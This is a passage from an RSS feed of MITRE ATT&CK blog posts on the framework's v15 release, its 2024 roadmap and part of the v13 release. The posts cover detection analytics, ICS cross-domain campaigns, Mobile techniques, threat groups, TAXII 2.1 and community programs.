Measures</strong></h3><p>You’ll find expanded detections in v15 to assist your detection engineering. Previously, we structured our analytics in a pseudo format that was consistent with the Cyber Analytic Repository (CAR). In some cases this was hard to understand.</p><p>In v15, we transformed that format into a real-world query language style (like Splunk) that is compatible with various security tools. These upgrades are featured in detections across the framework including some techniques within the <a href="https://attack.mitre.org/tactics/TA0002/">Execution</a> tactic.</p><p>Our aim with these upgrades, is to reflect the data source itself is the data you should be collecting, and to provide an understandable format that pairs well with every day defender tools (i.e. SIEMs and Sensors).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*TPJCF1m40g_-UQwTjlIjaw.png" /></figure><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*sP0Dsh-4G3EqqmWg77cBFw.png" /></figure><p>We have also synced up some mitigations within the parent to sub-technique relationship. Our team has analyzed a list of sub-techniques that had mitigations that the parent technique did not have. In v15, you will find some parent techniques now reflect what mitigations are seen in the sub-technique.</p><p><strong>What’s Next: </strong>As we gear up for October, we’ll be completing the Execution detections, refining Credential Access detections, diving into Cloud analytics, and restructuring our data sources for better accessibility.</p><h3><strong>ICS | Cross-Domain Campaigns</strong></h3><p>We’ve been working to retrofit major incidents in the ICS space to improve understanding and showcase how ICS and enterprise techniques intersect in each event. V15 illuminates some of the ICS-Enterprise integration efforts, with the release of four cross-mapped campaigns:</p><p>· Starting with <a href="https://attack.mitre.org/campaigns/C0030/">Triton</a>, the Safety Instrumented System attack of 2017 that shook the petrochemical industry to its core.</p><p>· Then there’s <a href="https://attack.mitre.org/campaigns/C0032/">C0032</a>, a campaign spanning various utilities from 2014 to 2017, often grouped with the petrochemical incident but distinctly different in nature.</p><p>· Next up, <a href="https://attack.mitre.org/campaigns/C0031/">Unitronics</a>, a spree that zeroed-in on specific devices and impacted utilities and organizations worldwide. This campaign saw adversaries disrupting device interfaces to make them unusable for end users.</p><p>· Fast forward to <a href="https://attack.mitre.org/campaigns/C0034/">2022 Ukraine Electric Power</a>, where we witnessed a glimpse into the future of ICS attacks, with hypervisor features and shared domain access exploited to infiltrate ICS systems and unleash havoc. The campaign highlights key considerations regarding hypervisor usage across multiple domains, and the abuse of native features in vendor software.</p><p>2022 Ukraine also spawned two new ICS techniques that are featured in this release: <a href="https://attack.mitre.org/techniques/T0895/">T0895: Autorun Image</a> and <a href="https://attack.mitre.org/techniques/T0894/">T0894:System Binary Proxy Execution</a> via vendor application binaries.</p><p><strong>What’s Next: </strong>v16 will launch ICS sub-techniques, along with a structured cross-walk to enable mapping between deprecated and new techniques. We’ll also be releasing new asset coverage and updates on our exploration into incorporating more sectors into the ICS matrix.</p><h3><strong>Mobile | New Techniques, Software, Groups &amp; Mitigations</strong></h3><p>With help from our community, this release incorporates new techniques, including — <a href="https://attack.mitre.org/techniques/T1664/">exploiting software vulnerabilities for initial access </a>and <a href="https://attack.mitre.org/techniques/T1422/">adversaries performing active and automated discovery for the lowdown on your network setup</a> — and incorporated fresh software and groups. We also added a new mitigation to the Mobile matrix, <a href="https://attack.mitre.org/mitigations/M1059/">M1059 Do Not Mitigate</a> (for Mobile) as a sneak peek to the new mitigations that will be added in future releases. This release also features the first Mobile campaign, <a href="https://attack.mitre.org/campaigns/C0033/">C0033</a>, associated with <a href="https://attack.mitre.org/groups/G0056/">PROMETHIUM (G0056)</a>. The group primarily targets Windows devices, however, recent reporting and external contributions demonstrated a shift to mobile exploitation on Android and iOS devices.</p><p>We added in Mobile techniques to existing Groups and Software to illuminate the shift to include mobile exploitation. This includes building out the <a href="https://attack.mitre.org/groups/G0099/">APT-C-23 (G1028)</a> profile, mirroring this South American threat group’s targeting of Android and iOS devices, and recording how <a href="https://attack.mitre.org/groups/G1002/">BITTER (G1002)</a> has distributed malicious apps via SMS, WhatsApp, and various social media platforms.</p><p><strong>What’s Next: </strong>In the coming months, we’ll be rolling out more structured detections, and boosting proactivity across Mobile by evaluating incorporation of pre-intrusion techniques, like active and passive reconnaissance, and acquiring or developing resources for targeting.</p><h3><strong>Cyber Threat Intelligence | More Cybercriminal, Underrepresented Groups</strong></h3><p>We’re working towards better reflecting the threat landscape by infusing the framework with more cybercriminal and underreported adversary activity. This release showcases new cybercriminal operations and highlights <a href="https://attack.mitre.org/groups/G1026/">Malteiro</a>, a criminal group believed to be based in Brazil. They are <a href="https://blog.scilabs.mx/en/cyber-threat-profile-malteiro/">known</a> for operating and distributing the Mispadu/URSA banking trojan through a malware-as-a-service model. Banking trojans, a notorious threat in Latin America, are increasingly spreading their chaos across borders, courtesy of malware developers selling tools to overseas operators. Malteiro’s operations exemplify this targeting shift, evident in a <a href="https://blog.morphisec.com/mispadu-infiltration-beyond-latam">recent campaign</a> affecting European entities across various sectors.</p><p><strong>What’s Next: </strong>We’ll continue conducting thorough assessments of Groups, Software, and Campaigns to up the framework realism quotient and provide clearer insights into adversary activities. We’re also teaming up with ATT&amp;CK domain leads to expand coverage of cross-domain intrusions.</p><h3><strong>Software Dev | TAXII 2.1, FTW</strong></h3><p>We’ve been working towards our goals of enhancing Navigator’s usability and streamlining processes for ATT&amp;CK Workbench. Most importantly, we’re taking our TAXII server to new heights, and by December 18, we’ll be retiring the TAXII 2.0 server and transitioning to the upgraded TAXII 2.1 version. You can locate the documentation for the TAXII 2.1 server in our <a href="http://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a>.</p><p><strong>What’s Next: </strong>We’ll be continuing to<strong> </strong>enhance usability on ATT&amp;CK Workbench and Navigator, and building towards swifter Groups and Software releases. Mark your calendars to update the URLs for TAXII 2.1 clients to connect to <a href="https://attack-taxii.mitre.org/">https://attack-taxii.mitre.org</a> instead of <a href="https://cti-taxii.mitre.org/">https://cti-taxii.mitre.org</a>!</p><h3><strong>In Conclusion | Field Reports, Benefactors</strong></h3><p>We’re always on the lookout for field reports and insights from those of you on the ground. Your observations play a crucial role in improving ATT&amp;CK’s tactical utility — so remember, <em>if you see something, </em><a href="https://attack.mitre.org/resources/engage-with-attack/contribute/"><em>contrib something</em></a>. Curious about how a contribution becomes a technique? Check out <a href="https://youtu.be/v24a5IOwObc?si=C9CZzBThVfLS19zH">our video</a> that walks you through the process.</p><p>If you’re interested in contributing to ATT&amp;CK’s overall autonomy, flexibility, and free services, you can find more details on our <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">Benefactor</a> page. We are deeply grateful to our initial cohort of benefactors, SOC Prime, Tidal Cyber, and Zimperium, for their generous support.</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00779–3.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=26685f300acc" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-v15-26685f300acc">ATT&amp;CK v15 Brings the Action</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-04-23T16:18:30.137Z</pubDate>
</item>
<item>
<title>ATT&amp;CK 2024 Roadmap</title>
<link>https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*NdNL-P_jvIn29chXCd8RmA.jpeg" /></figure><h4>Enhancing usability, expanding scope, optimizing defenses</h4><p>2023 was dynamic year for ATT&amp;CK. We marked a decade of progress since the framework’s inception and achieved some key milestones to make ATT&amp;CK more accessible for a wider community. Our scope (slightly) expanded to encompass activities adjacent to direct Enterprise interactions, such as non-technical, deceptive practices and social engineering techniques (<a href="https://attack.mitre.org/techniques/T1657/">Financial Theft</a>, <a href="https://attack.mitre.org/techniques/T1656/">Impersonation</a>, and <a href="https://attack.mitre.org/techniques/T1598/">Spearphishing Voice</a>). We enhanced detection capabilities with integrated notes, pseudocode from <a href="https://car.mitre.org/">CAR</a>, and <a href="https://github.com/mitre-attack/bzar">BZAR</a>-based analytics. The ICS matrix welcomed the addition of <a href="https://attack.mitre.org/assets/">Assets</a> to enhance inter-sector communication and mapping. We rolled out Mobile-specific <a href="http://attack.mitre.org/datasources/">data sources</a>, structured detections, and behaviors like <a href="https://attack.mitre.org/techniques/T1660/">smishing, quishing, and vishing</a>. Website navigation was improved, along with a faster Search bar, and updates that hit you faster than you can say “<a href="https://attack.mitre.org/resources/changelog.html">resources/changelog.html</a>”. We also maintained a steady cadence of updates and new content from the ATT&amp;CK team and external contributors.</p><p>In October, we successfully held <a href="https://attack.mitre.org/resources/learn-more-about-attack/attackcon/october-2023/">ATT&amp;CKcon 4.0</a>, with new insights shared and realistic applications demonstrated by practitioners. And finally, we kickstarted the <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">ATT&amp;CK Benefactor program</a>.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*BMDwDsQqdUFRS-B-t7MyTA.jpeg" /><figcaption>ATT&amp;CKcon 4.0 Themed Snacks</figcaption></figure><h3><strong>2024 Roadmap: Vision &amp; Goals</strong></h3><p>Since launching ATT&amp;CK, we’ve been humbled to witness how the community has integrated it across widely varied spheres and around the globe. The vision for ATT&amp;CK has always been to enable the broadest use across the widest spectrum of stakeholders — whether you’re cross-mapping between domains, annotating and developing tailored Navigator layers, or using the framework as a blueprint to build multi-platform threat models. ATT&amp;CK was designed to empower defenders precisely where they need it most. This is the core thesis for ATT&amp;CK, and as its stewards, we’ll continue prioritizing measures that advance a more inclusive, relevant, and actionable framework.</p><p>In line with this vision, our 2024 goals are to bolster broader usability and enhance actionable defensive measures for practitioners across every domain. This includes exploring scope adjustments and platform rebalancing, as well as implementing structural modifications with the introduction of ICS sub-techniques. A core focus will be reinforcing defensive mechanisms and optimizing their user-friendliness. We’ll be bridging Linux and macOS information gaps and enhancing prominent adversary representation. The ATT&amp;CK Navigator, Workbench, and website will feature reengineering to improve accessibility and enable swifter ATT&amp;CK Group/Software/Campaign updates. We’ll also be sunsetting the TAXII 2.0 server by December 18 in favor of the upgraded TAXII 2.1 version. Finally, we’ll continue amplifying the key driver behind ATT&amp;CK — community collaboration. This includes hosting ATT&amp;CKcon 5.0 in October, and maintaining support for the <a href="https://www.attack-community.org">European Union (EU)</a> and <a href="https://na.eventscloud.com/website/67610/">Asia-Pacific (APAC) ATT&amp;CK Community</a> Workshops.</p><h3><strong>Enterprise | Integrated Defense</strong></h3><p>In tune with ATT&amp;CK’s vision, we’re continuously re-evaluating Enterprise’s scope to more accurately reflect the threats faced by real defenders. Matrices and platforms are conceptual schematics, not real-world structures, and we’re assessing realignments, expansions, and refinements of platforms to represent interconnected organizations, the adversaries they encounter, and the reality of defenders. Our goal is to advance a cohesive and integrated framework that provides more functional use cases and empowers users to visualize and create adaptable defenses against cross-platform threats.</p><p><strong>Cloud | Matrix Balance &amp; More Actionability</strong></p><p>Our Cloud goal this year is to enable defenders (both new and seasoned) to better leverage the Cloud matrix for defensive action. This includes focusing on emerging and significant threats to the domain, upgrading Cloud analytics, and optimizing the balance between generalization and detail in the matrix.</p><p>With a considerable portion of cloud identities retaining super admin access, and the frequency of identity-related intrusions across the domain, we’ve been reinforcing and creating more detailed techniques for identity-based attacks. We’ll also be diving into the exploitation of Continuous Integration/Continuous Deployment (CI/CD) pipelines and the malicious use of Infrastructure as Code (IaC). Our Cloud analytics effort will elevate your actionability, by outlining the steps to detect specific behaviors, and providing additional context on what to find and collect.</p><p>We’ll also be evaluating how to best refine the balance between abstraction and specificity in the matrix. Our exploration will assess if the platforms are broad enough to cover a wide range of cloud environments and threats, yet specific enough to inform defensive actions. This balance is crucial for the matrix to remain practical and useful for defenders operating in diverse cloud environments. Our aim is to make navigating the Cloud matrix more intuitive and enable users to prioritize techniques relevant to their specific platform.</p><p>Ready to navigate the Cloud with us? Sail over to #<a href="https://mitreattack.slack.com/archives/C035Z0AL8R0"><strong>cloud_attack</strong></a>.</p><p><strong>macOS/Linux | Countermeasures for Priv Esc and Defense Evasion</strong></p><p>Our goal for Linux and macOS is to equip practitioners with more robust countermeasures and help bridge the information gap on defending these systems. We’ll continue tracking down in-the-wild adversary behaviors and building more macOS and Linux-only (sub)techniques to optimize defensive arsenals. For Linux we’ll be exploring privilege escalation and defense evasion to better align with in-the-wild adversary activity. On the macOS side, we’ll be strategically bolstering the platform, with a particular emphasis on threats associated with elevated permissions.</p><p>If you have intelligence or technique ideas, we would love to collaborate. We rely on the practitioners who work with these systems day-in and day-out to help us identify gaps and provide invaluable insights. Ready to contribute? <a href="http://attack@mitre.org/">email us</a> and join our <strong>#</strong><a href="https://mitreattack.slack.com/archives/C035BUEMMHP"><strong>linux_attack</strong></a> or <a href="https://mitreattack.slack.com/archives/C0351D4AU1J"><strong>#macos_attack</strong></a> slack channel.</p><h3><strong>Defensive Coverage | Upgrading, Converting &amp; Restructuring Defensive Measures</strong></h3><p>Our Defensive goal this year is to expand detections and mitigations to help you better optimize your detection engineering — and maybe get a little more actionable. The April release will include both new and updated mitigations that incorporate best practices from contributors, and industry standards meticulously mapped by our defense team.</p><p>Over the past few months, we’ve also been examining analytic language approaches. Our aim? Transforming detection logic into formats compatible with different security tools, including more consistent with real-world query languages such as Splunk . This will simplify the process of aligning your SIEM data with ATT&amp;CK detections, making it easier to understand. We’re also incorporating data collection sources for a given detection query. For example, pulling information from Windows Event logs or Sysmon and the associated Event Code. The new analytic style in ATT&amp;CK will overhal the previously used CAR-like pseudocode, and will be the model for future analytics. This will enhance compatibility across various environments and help you hunt threats more efficiently.</p><p>Lately, we’ve been prioritizing improving detections under the Execution tactic, where some of the most employed techniques fall. v15 will showcase a subset of these enhanced detections, featuring the trifecta of <a href="https://car.mitre.org/">CAR</a> (Cyber Analytics Repository) pseudocode, <a href="https://github.com/mitre-attack/bzar">BZAR</a>-based analytics (Bro/Zeek ATT&amp;CK-based Analytics and Reporting) and detection notes.</p><p>Gearing up for October, we’ll be completing the enhanced detections for Execution, sculpting out Credential Access detections, exploring the universe of Cloud analytics, and navigating how to restructure our data sources for improved accessibility. This means sprucing up data source definitions and matching them to everyday use cases like sensor mappings. This way, you can more easily identify the tools and events that clue you in on shady activity. Additionally, you can opt for the data sources that best align with your specific needs. The revamp will also include the introduction of STIX IDs for data components, making it more intuitive to reference and integrate data sources.</p><p>Join our ranks at <a href="https://mitreattack.slack.com/archives/C036RA0B7EX"><strong>#defensive_attack</strong></a> channel.</p><h3><strong>ICS | Subs, Asset Expansion, &amp; Cross-Domain Integration</strong></h3><p>ICS is leveling up this year. Our goals include broadening ICS horizons with new asset coverage, exploring platform scope expansion, and continuing our multi-domain integration quest. We’ll also be diving deeper into adversary behaviors with the introduction of sub-techniques. v15 will showcase some of integration efforts, with the release of cross-mapped campaigns. These campaigns track IT to OT attack sequences, helping defenders better understand multi-domain intrusions and informing unified defense strategies across technology environments.</p><p>The October release will feature a structural shake-up, with the first tranche of the long-awaited sub-techniques. Like Enterprise and Mobile sub-techniques, ICS subs will break down techniques into more detail. This increased granularity allows defenders to understand the nuances of adversaries’ execution of a given technique, enhancing their ability to detect and mitigate them. The technique restructuring will involve modifying the name and scope of techniques and integrating them more effectively with other domains. This integration will foster a more comprehensive defensive approach on both the right and left of launch. You can expect a subs crosswalk to help you understand our decisions and how things map between deprecated and new techniques.</p><p>October will also include some additional treats with Asset coverage expansion, building upon the <a href="https://medium.com/mitre-attack/attack-v14-fa473603f86b">Asset refactoring in v14</a>. The refactoring strived to provide a clearer picture of the devices, systems, or platforms a specific technique could target and introduced the concept of Related Assets. Related Assets links cross-sector Assets that share similar functions, capabilities, and architectural locations/properties, highlighting that they may also be susceptible to the same techniques. v16 will feature additional Related Assets, as well as more in-depth definitions and refined mappings of technique relationships for different devices and systems. You can start leveraging Assets for your defensive activities by viewing the technique mappings from <a href="https://attack.mitre.org/assets/">Asset</a> pages, or by reviewing Asset mappings from a technique page. We’ll also be scouting how to incorporate additional sectors such as such as maritime, rail, and electric.</p><p>We welcome input from all sectors on how to improve identification of key assets and any additional adversary behaviors you have observed in the wild. Reach out to us at <a href="mailto:attack@mitre.org">attack@mitre.org</a> or <strong>#</strong><a href="https://mitreattack.slack.com/archives/C061YMN07M1"><strong>ics_attack</strong></a></p><h3><strong>Mobile | Detections &amp; Mitigations Optimization + PRE Exploration</strong></h3><p>Mobile’s goal is to dial up the pre-and-post-compromise defensive measures this year, with a detections and mitigations upgrade and an exploratory mission into pre-intrusion behaviors for the matrix. We introduced Mobile structured detections in v14 and will continue building out structured detections as well as expanding our mitigations across the matrix. For optimal actionability, we’ll be leveraging the best practices and tangible experiences from the mobile security community.</p><p>In the coming months we’ll also be evaluating how to enhance inter-domain connectivity across platforms and exploring integrating proactive tactics into the Mobile matrix. Our goal is to better reflect evolving adversary activity targeting the domain. This research quest will examine adversary actions before attacks, like active and passive <a href="https://attack.mitre.org/tactics/TA0043/">Reconnaissance</a>, and <a href="https://attack.mitre.org/tactics/TA0042/">acquiring or developing resources</a> for targeting purposes.</p><p>Collaboration and knowledge-sharing with the community will to be a driver for Mobile’s development in 2024. In addition to ramping up detections and mitigations, we’re particularly interested in partnering with mobile defenders to examine potential areas where communications platforms or domains could be added into ATT&amp;CK. If you’re interested, connect via <a href="mailto:attack@mitre.org">attack@mitre.org</a> or join <strong>#</strong><a href="https://mitreattack.slack.com/archives/C036CEG4VRP"><strong>mobile_attack</strong></a><strong>.</strong></p><h3><strong>Software Development | Enhanced Usability &amp; Streamlined Workflows</strong></h3><p>Our Software goals this year are to increase usability across ATT&amp;CK Workbench and Navigator, and streamline Groups and Software releases. Adversaries evolve quickly, so we’re optimizing Workbench workflows to harmonize Group and Software releases more closely to their cadence. This includes developing enhanced search capabilities, improving ATT&amp;CK object-collection association, and overhauling the Collection Manager UI for the ATT&amp;CK Workbench. These renovations will fine-tune the approval of ATT&amp;CK object changes and the matching of collection bundle differences with official ATT&amp;CK changelog types, resulting in swifter releases.</p><p>For ATT&amp;CK Navigator, we’re refining the user experience, <em>and</em> the experience of anyone reading your reports. We’ll be upgrading SVG export function for sleeker output designs, providing smoother navigation with intuitive export controls, and rolling out an in-website tutorial for mastery of all the key features. We’ll also be updating the official content source to the STIX 2.1 repository — making everything a little more robust and flexible.</p><p>Finally, we’re taking our TAXII server to the next level! We’ll be sunsetting the TAXII 2.0 server by December 18, as we transition to the upgraded TAXII 2.1 version. You can access the documentation for TAXII 2.1 server in our <a href="http://github.com/mitre-attack/attack-workbench-taxii-server">GitHub repository</a>. Remember to switch URLs for TAXII 2.1 clients to connect to <a href="https://attack-taxii.mitre.org">https://attack-taxii.mitre.org</a> instead of <a href="https://cti-taxii.mitre.org.">https://cti-taxii.mitre.org.</a> And get ready to experience enhanced features and smoother operations.</p><h3><strong>Cyber Threat Intelligence | More Cybercriminal, Underrepresented Groups</strong></h3><p>With CTI, our mission is to better reflect the reality of the threat landscape by infusing more cybercriminal and underreported adversary activity into the framework. By bridging gaps in representation and minimizing those unknowns, we aim to provide defenders with better insights and tools to counter a wider array of threats. A pivotal aspect of this effort includes gap assessments of Groups, Software, and Campaigns. These evaluations will help us pinpoint any disparities between the current content and the reality of adversary activities.</p><p>Our releases this year will feature more cybercriminal operations and under-monitored regions, including Latin America, offering a more nuanced understanding of global threats. We’re also collaborating with ATT&amp;CK domain leads to expand coverage of cross-domain intrusions to inform a more unified approach to undermining adversaries.</p><p>To join this quest, engage at <a href="mailto:attack@mitre.org">attack@mitre.org</a></p><h3><strong>Community Collaboration</strong></h3><p><strong>ATT&amp;CK Community Workshops | Practitioner-led Forums for Activating ATT&amp;CK</strong></p><p>We’re always inspired to see how ATT&amp;CK is being used in innovative ways to upgrade defensive capabilities. The regional ATT&amp;CK community workshops — organized by practitioners, for practitioners — provide forums to share insights, use cases, and collaborative approaches for leveraging ATT&amp;CK.</p><ul><li>The <a href="https://www.attack-community.org/event/">European Union (EU)</a> ATT&amp;CK Community workshop, hosted by the <a href="https://ccb.belgium.be/en">Centre for Cybersecurity Belgium </a>and supported by the <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/">Center for Threat-Informed Defense (CTID)</a> was the first regional ATT&amp;CK workshop, The 2024 iteration will take place in Brussels, Belgium on May 17, in-person and virtually.</li><li>The <a href="https://na.eventscloud.com/website/67610/">Asia-Pacific (APAC) ATT&amp;CK Community Workshop</a>, hosted by the by the <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/">CTID</a>, launches this April 25–26 in Singapore, and <a href="https://na.eventscloud.com/esurvey/index.php?surveyid=119679&amp;st=11ed3b2537a57f262963e9006f1f47b114c68f6f">virtual attendance</a> is still open. The Workshop will advance threat-informed defense through hands-on training, ATT&amp;CK best practices, worst practices, and moonshot approaches.</li></ul><p><strong>ATT&amp;CKcon 5.0 | Great Speakers, Content, &amp; Conversations around ATT&amp;CK</strong></p><p><strong>ATT&amp;CKcon 5.0 </strong>will be arriving October 22–23, featuring both virtual and in-person attendance from McLean, VA. Stay tuned to our Twitter and LinkedIn channels for updates on our Call for Presentations, which will open in the coming months, followed by our illustrious speaker lineup. If your organization is thinking about joining the ATT&amp;CKcon adventure as a sponsor, please reach out to us at attackcon@mitre.org.</p><p><strong>Benefactor Program | Empowering Defenders, Sustaining Independence</strong></p><p>We want to take a moment to share some insights into the foundational tenants and financial realities of ATT&amp;CK. Much like we crowd-source intelligence and rely on community contributions, ATT&amp;CK itself was built to be independent, responsive, and part of the global community.</p><p>From the outset, we deliberately chose not to align ATT&amp;CK with any specific government department or agency. This decision was made to maintain autonomy, flexibility, and to foster collaboration across the broadest spectrum of stakeholders. While this approach has facilitated agility and international partnerships, it also means that ATT&amp;CK lacks a dedicated funding source.</p><p>To bridge this funding gap and ensure the continuity of our operations, as well as expanding into new domains, we launched the <a href="https://attack.mitre.org/resources/engage-with-attack/benefactors/">Benefactor Program</a> last year. This program enables tax-deductible, charitable donations from individuals and organizations who believe in ATT&amp;CK’s mission. These contributions allow us to continue offering free and accessible services while also advancing our capabilities and scope.</p><p>We are <strong>immensely grateful</strong> for the support we have received thus far from initial benefactors SOC Prime, Tidal Cyber, and Zimperium. We remain committed to serving the community with transparency; whether you’re a contributor, a fellow defender, or just getting started, we thank you for being part of ATT&amp;CK’s journey.</p><h3><strong>Looking Forward</strong></h3><p>Mark your calendars for the v15 release on April 23! You’ll see some novel content interspersed with familiar elements, as well as more practical defensive measures.</p><p>As always, we value the opportunity to collaborate with you in ensuring that ATT&amp;CK remains a living framework, where each contribution, conversation, or new implementation fuels its evolution. We look forward to continuing this adventure with you.</p><p>Connect with us on <a href="mailto:attack@mitre.org">email</a>, <a href="https://twitter.com/MITREattack">Twitter</a>, <a href="https://www.linkedin.com/showcase/mitre-att&amp;ck/">LinkedIn</a>, or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">Slack</a>.</p><p>©2024 The MITRE Corporation. ALL RIGHTS RESERVED. Approved for public release. Distribution unlimited 24–00779–2.</p><img alt="" height="1" src="https://medium.com/_/stat?event=post.clientViewed&amp;referrerSource=full_rss&amp;postId=8dfc46d1ad1b" width="1" /><hr /><p><a href="https://medium.com/mitre-attack/attack-2024-roadmap-8dfc46d1ad1b">ATT&amp;CK 2024 Roadmap</a> was originally published in <a href="https://medium.com/mitre-attack">MITRE ATT&amp;CK®</a> on Medium, where people are continuing the conversation by highlighting and responding to this story.</p>
]]></content:encoded>
<pubDate>2024-05-21T13:58:40.300Z</pubDate>
</item>
<item>
<title>ATT&amp;CK v13 Enters the Room</title>
<link>https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff?source=rss----6da19bd08fba---4</link>
<guid>https://medium.com/mitre-attack/attack-v13-enters-the-room-5cef174c32ff?source=rss----6da19bd08fba---4</guid>
<content:encoded><![CDATA[
<figure><img alt="" src="https://cdn-images-1.medium.com/max/1024/1*PkApzI8NMYPKdGGq2ZA1Vw.png" /></figure><h3>ATT&amp;CK v13 Enters the Room: Pseudocode, Swifter Search, and Mobile Data Sources</h3><p>It’s not like a regular Tuesday, it’s a lucky Tuesday — ATT&amp;CK v13 has arrived. As we outlined in our <a href="https://medium.com/mitre-attack/2023-attack-roadmap-452fab541673">Roadmap</a>, we’re working toward enhanced tools for lower-resourced defenders, improving ATT&amp;CK’s website usability, enhancing ICS and Mobile parity with Enterprise, and evolving overall content and structure this year. ATT&amp;CK v13 is bringing some analytics pseudocode, Mobile-specific data sources, key website updates, ICS Asset refactoring, and more Cloud and Linux coverage. For the rest of our regular updates/additions across Techniques, Software, Groups and Campaigns take a look at our <a href="https://attack.mitre.org/resources/updates/updates-april-2023/index.html">release notes</a>, our (new) <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog-detailed.html">detailed changelog</a>, or our (new) <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog.json">changelog.json</a>.</p><h3>Defensive Easy Button: Pseudocode for Detection</h3><p>This release features a new defensive ‘easy button’, with the addition of <a href="https://car.mitre.org/">CAR</a> pseudocode to a number of our data components. These pseudocode analytics add more context on what you should find and collect, by describing at a high level the steps involved in detecting certain types of behaviors. You can use these analytics as a blueprint for your custom detections, leaving you with more time to spend on the defensive activities of your choice.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/838/1*qbIfAT_TjlqGitKsI1z65Q.png" /></figure><p>Moving forward we’ll be revamping Mitigations and improving defenses tactic-by-tactic, by incorporating analytics from CAR and dynamic research into the data components falling under a given tactic. If you’d like to join our efforts, <a href="mailto:attack@mitre.org">let us know</a> or join us in the <a href="https://mitreattack.slack.com/archives/C036RA0B7EX"><strong>#defensive_attack</strong></a> channel.</p><h3>ATT&amp;CK’s Infrastructure: ATT&amp;CK Search 2.0 and changelog.json</h3><p>Two of our most frequently requested items are now here: faster search and machine-readable changelogs!</p><p>We’ve <strong>all</strong> experienced the patience-building opportunity associated with using the ATT&amp;CK website search, so we’re thrilled to finally introduce a new and improved search! While it won’t be breaking the sound barrier anytime soon, it will save you some serious time when you’re trying to figure out which techniques cover Import Access Table. Your initial search with the enhanced version will be in the 5-second range, with following queries resolving near instantaneously. We’ll continue to adjust this important feature and appreciate all of you who stayed with us through the search bar trials. Let us know if you spot any new corner cases!</p><p>Another significant addition to this release is a <a href="https://attack.mitre.org/docs/changelogs/v12.1-v13.0/changelog.json">machine-readable changelog</a>. You’ll now be able to access and parse through the changelog, quickly identifying and integrating the updates. For more details check out the <a href="https://github.com/mitre-attack/mitreattack-python/blob/master/mitreattack/diffStix/README.md">changelog.json format details in our GitHub</a>. Our <a href="https://attack.mitre.org/resources/updates/updates-april-2023/">release notes format</a> has also been improved, now documenting New, Major Version Changes, Minor Version Changes, and Patches for each of Techniques, Mitigations, Data Sources, Data Components, Software, Groups, and Campaigns. If you’re wondering what “Patches” are, it’s what we’re calling changes so minor (e.g., typos, URL fixes, grammar) no version update was necessary.</p><p>We don’t expect quite as much celebration for our ATT&amp;CK Navigator updates, but new updates coming with ATT&amp;CK v13 enable you to further customize your layer colors, scoring, image orientation and preset image sizing — for more details, check out the Navigator <a href="https://mitre-attack.github.io/attack-navigator/">release notes</a> (click on the ? in the top right of Navigator).</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/138/1*1N1Gp76i9hL5TaCaMl7_Kw.png" /></figure><h3>Mobile: Data Sources are Live</h3><p>On the Mobile front, you’ll now be able to access <a href="http://attack.mitre.org/datasources/">Mobile-specific Data Sources</a>! Mobile has joined the filter list along with Enterprise and ICS, enabling you to toggle between the data sources for your chosen domain(s). In addition to the new Mobile-specific sources, the cross-domain mappings with Enterprise are now more accessible. The Mobile-specific and cross-mapped sources are also listed on the individual Data Source pages.</p><figure><img alt="" src="https://cdn-images-1.medium.com/max/480/1*3qu362KQAsQCKvDZuYZUIw.png" /></figure><p>Over the next few months, we’ll continue to add to our Mobile data sources, as well as architecting <a href="https://medium.com/mitre-attack/attack-goes-to-v11-599a9112a025?source=collection_home---4------0-----------------------">structured </a><a href="https://attack.mitre.org/resources/updates/">detections</a>. If you’d like to contribute to this space or start a conversation, <a href="mailto:attack@mitre.org">email</a> or <a href="https://join.slack.com/t/mitreattack/shared_invite/zt-ny1a3yon-XkT_OS1IF~ZYrESq8Xtqjg">slack</a> us (don’t call).</p><h3>ICS: Asset Refactoring for Enhanced Coverage</h3><p>The ICS matrix features new techniques, a freshly cross-mapped campaign, and updates to Assets (the functional components of the systems in the ICS domain). Our Assets refactoring effort seeks to align how different industries describe assets, in order to better map device functionality to core dependencies and associate the Assets to the relevant techniques. Through this effort we’ve also been working to address gaps from underreported industries. We’ll continue to collaborate with the ICS community to better build out and describe assets and create these mappings. Our goal is to include Assets in the metadata box on technique pages to help inform defenders about a device’s susceptibility to techniques.</p><h3>Campaigns: Criminals, APTs and Cross-Mappings</h3><p>Our Campaigns game is going strong, with v13 showcasing a blend of recent cyber intrusions and those previously captured in a Group page. A couple of our more contemporary entries include APT41’s compromise of U.S. state government networks (<a href="http://attack.mitre.org/campaigns/C0017/">C0017</a>), and an AvosLocker ransomware-as-a-service operation (<a href="http://attack.mitre.org/campaigns/C0018/">C0018</a>). Some of the older activity previously featured in Groups, include APT29’s <a href="http://attack.mitre.org/campaigns/C0023/">Operation Ghost</a> and the <a href="http://attack.mitre.org/campaigns/C0024/">SolarWinds</a> compromise. The star of this release, and one we’re particularly excited about, is the cross-domain Campaign entry, the <a href="http://attack.mitre.org/campaigns/C0025/">2016 Ukraine operation</a> by Sandworm Team. Over the next several months, we’ll continue to focus on criminal group operations and expanding on the hybrid Campaigns that traverse 